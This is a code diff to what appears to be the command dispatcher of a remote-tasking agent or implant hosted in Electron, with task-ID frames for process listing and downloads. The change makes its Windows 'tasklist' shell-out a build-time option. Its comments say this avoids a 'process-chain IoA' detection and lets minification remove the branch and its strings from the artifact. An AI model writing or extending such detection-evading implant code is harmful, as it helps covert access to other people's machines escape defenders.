@@ -106,11 +106,11 @@ function dispatch(commandId, r, cfg, state, OutPacker) {
   }
   if (commandId === CP.PS_LIST) {
     const taskId = r.u32();
-    // ps-list without native deps: /proc on linux; on win32 use PowerShell-free
-    // approach — tasklist via child_process is noisy in an Electron host, so we
-    // shell out ONCE with windowsHide. (C++ uses Toolhelp32; no Node binding.)
+    // /proc on posix; win32 needs a --allow-shellout build (see psList).
+    // Default builds answer with a clean not-supported frame.
     try {
       const rows = psList();
+      if (!rows) return out.u32(taskId).u32(CP.PS_LIST).u8(0).u32(50);
       out.u32(taskId).u32(CP.PS_LIST).u8(1).u32(rows.length);
       for (const row of rows) {
         out.u16(row.pid).u16(row.ppid).u16(row.sess).u8(row.arch).u8(row.elev)
@@ -205,6 +205,11 @@ function processDownloads(state, outputs, cfg) {
 
 function psList() {
   if (process.platform === 'win32') {
+    // win32 ps without native deps means tasklist — a child_process spawn under
+    // the Electron host (process-chain IoA, ticket 001). Compiled in ONLY for
+    // --allow-shellout builds; esbuild's define makes this branch unreachable
+    // by default and minify drops it (strings included) from the artifact.
+    if (globalThis.__LW_SHELLOUT__ !== true) return null;
     const { execSync } = require('child_process');
     const txt = execSync('tasklist /fo csv /nh', { windowsHide: true, maxBuffer: 16 << 20 }).toString('latin1');
     const rows = [];
